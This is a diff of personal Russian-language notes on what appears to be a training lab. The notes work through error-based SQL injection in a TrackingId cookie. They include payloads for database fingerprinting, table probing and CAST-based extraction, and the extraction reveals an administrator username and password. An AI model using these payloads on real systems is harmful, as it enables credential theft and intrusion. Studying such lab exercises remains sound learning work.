@@ -50,7 +50,7 @@ CAST('text' AS int)  → ОШИБКА (нельзя преобразовать) 
 4)   проверка бд 
 
 
-
+```sql
 |Oracle|`SELECT banner FROM v$version   SELECT version FROM v$instance 
 |Microsoft|`SELECT @@version`|
 |PostgreSQL|`SELECT version()`|
@@ -94,11 +94,12 @@ CAST('text' AS int)  → ОШИБКА (нельзя преобразовать) 
 
 -- SQLite: системная таблица sqlite_master
 ' AND (SELECT COUNT( * ) FROM sqlite_master)>0--            нет
+```
 
 
 
 5)  узнать наличие таблицы users
-
+```sql
 ' AND EXISTS(SELECT 1 FROM users)--          без ошибок - 
 ' AND EXISTS(SELECT 1 FROM FC0Fusers)--    с ошгибкой
 
@@ -110,31 +111,45 @@ CAST('text' AS int)  → ОШИБКА (нельзя преобразовать) 
 ' AND (SELECT 'a' FROM users WHERE username= 'administrator')='a   не работает  
 ' AND (SELECT 'a' FROM users WHERE username= 'administrator')=a   не работает  
 ничего сука не работает!!!!
+```
 
+```q
 и ошибка 
 Unterminated string literal started at position 95 in SQL SELECT * FROM tracking WHERE id = 'nMUDX6uNhn7G8R3i' AND (SELECT 'a' FROM users WHERE username='. Expected  char
 *запрос обрезался по длинне! максимум 95 символов*
-
+```
 Незавершенный строковый литерал, начинающийся с позиции 95 в SQL SELECT * ИЗ tracking, ГДЕ id = 'nMUDX6uNhn7G8R3i' И (ВЫБЕРИТЕ 'a' ИЗ users, ГДЕ username='. Ожидаемый символ
 
-короче говоря - ошибка говрит что с кавычками проблема!
-*запрос обрезался по длинне! максимум 95 символов*
+> короче говоря - ошибка говрит что с кавычками проблема!
+   запрос обрезался по длинне! максимум 95 символов*
 
 
-' AND (SELECT 'a' FROM users LIMIT 1)='a'--       работает
+```sql
+' AND (SELECT 'a' FROM users LIMIT 1)='a'-- 
+```
+работает
 *значит таблица юзерс существует!*
 
-' AND (SELECT password FROM users LIMIT 1) IS NOT NULL-- рабоатет
+```sql
+' AND (SELECT password FROM users LIMIT 1) IS NOT NULL--
+```
+рабоатет
 *значит существует первая строчка и колнка колонка паролей в таблице этой и ее значение не равно null*
 
 ==проблема в том что запрос обрезался на 95 символов==
 
 
-Cookie: TrackingId=jR6LbgZmpVcskt1a' AND (SELECT LENGTH(password) FROM users WHERE user='admin')=1--   ==не работает!!!==
+```sql
+Cookie: TrackingId=jR6LbgZmpVcskt1a' AND (SELECT LENGTH(password) FROM users WHERE user='admin')=1--   
+```
+==не работает!!!==
 
 *оказывается можно убрать TrackingId  чтобы освободить место*
 
-Cookie: TrackingId=j' AND (SELECT LENGTH(password) FROM users WHERE user='admin')=1--       ==работает!!!!==
+```sql
+Cookie: TrackingId=j' AND (SELECT LENGTH(password) FROM users WHERE user='admin')=1--     
+```  
+==работает!!!!==
 *просто обрезал jR6LbgZmpVcskt1a  на j *
 
 ```sql
@@ -174,10 +189,18 @@ CAST('text' AS int)  → ОШИБКА (нельзя преобразовать) 
 
 
 
-Cookie: TrackingId=j' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--      // ==этот запрос вернул мне ошибку с первым юзером в таблице== ERROR: invalid input syntax for type integer: "administrator" 
+```sql
+Cookie: TrackingId=j' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--   
+```
+
+// ==этот запрос вернул мне ошибку с первым юзером в таблице== ERROR: invalid input syntax for type integer: "administrator" 
 
 
-Cookie: TrackingId=j' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--    //==этот запрос вернул пароль==
+```sql
+Cookie: TrackingId=j' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)-- 
+```
+
+//==этот запрос вернул пароль==
 ERROR: invalid input syntax for type integer: "9ny8el74nqexhfvksk8h"
 
 
